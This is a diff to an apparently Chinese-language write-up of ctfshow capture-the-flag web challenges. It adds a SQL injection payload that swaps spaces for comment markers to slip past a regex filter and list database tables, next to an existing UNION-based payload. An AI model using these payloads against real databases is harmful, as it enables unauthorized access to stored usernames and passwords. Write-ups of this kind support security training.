@@ -570,6 +570,12 @@ $sql = "select username,password from user where username !='flag' and id = '".$
 1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23
 ```
 
+下面展示一种绕过正则的方式注入
+
+```sql
+1'union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23
+```
+
 ###### 继续显示属性名
 
 上面语句显示的表名是 ctfshow_user, ctfshow_user2，此处显示 ctfshow_user2 的属性名
